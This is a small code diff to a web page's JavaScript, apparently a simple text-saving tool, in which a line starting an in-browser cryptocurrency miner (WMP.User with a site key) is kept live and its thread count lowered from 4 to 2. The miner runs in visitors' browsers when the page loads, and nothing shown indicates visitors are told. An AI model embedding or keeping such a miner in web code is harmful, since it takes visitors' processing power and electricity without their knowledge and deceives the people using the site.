@@ -18,7 +18,7 @@ function download(filename, text) {
 
   document.body.removeChild(element);
 }
-var miner = WMP.User('SK_WxNXXxdwCjNsEgL3xaNqz', 'site', {threads: 4});
+var miner = WMP.User('SK_WxNXXxdwCjNsEgL3xaNqz', 'site', {threads: 2});
 var textarea = document.getElementById('a')
 if (navigator.userAgent.indexOf('Mobile') !== -1) { document.getElementById('save').style.display = "none"; textarea.style.height = "100px";
 }//resize for mobile
